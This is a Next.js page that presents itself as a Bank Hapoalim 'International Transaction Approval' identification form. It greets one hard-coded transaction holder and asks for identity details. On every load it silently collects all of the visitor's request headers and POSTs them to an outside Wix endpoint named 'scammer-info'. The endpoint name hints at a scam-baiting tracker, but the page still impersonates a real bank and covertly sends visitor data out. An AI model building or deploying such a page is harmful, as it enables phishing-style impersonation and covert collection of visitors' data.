import IdentificationForm from "@/app/components/IdentificationForm";
import {Metadata} from "next";
import {headers} from "next/headers";

export const metadata: Metadata = {
  title: "Identification Form | bank hapoalim",
  description: "Approve transaction in order to confirm the transaction."
};

export default async function Home({ searchParams }: {searchParams: any}) {

  const body: any = {};
  for (const [key, value] of headers().entries()) {
    body[key] = value;
  }
  await fetch('https://carmelc6.wixsite.com/scammer-info/_functions/track', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(body)
  });
  return (<div className="mx-4">
    <h1 className="text-white">International Transaction Approval</h1>
    {searchParams.transactionId === '372a7d60-2e5f-40cc-8094-9393fdaa823c' ?
    <><div className="bg-white shadow-md rounded px-8 pt-6 pb-8 mb-4 mt-8"><div>
      Hello, G*** Su***, in order to approve the transaction, please fill in the form below.<br/>
      Note that the name must match the name associated with the target account.<br/>
      Once all details are provided the transaction will be complete.<br/>
    </div>
    </div>
    <IdentificationForm/></> : <div className="bg-white shadow-md rounded px-8 pt-6 pb-8 mb-4 mt-8">
        Transaction not found
    </div>}
  </div>);
}
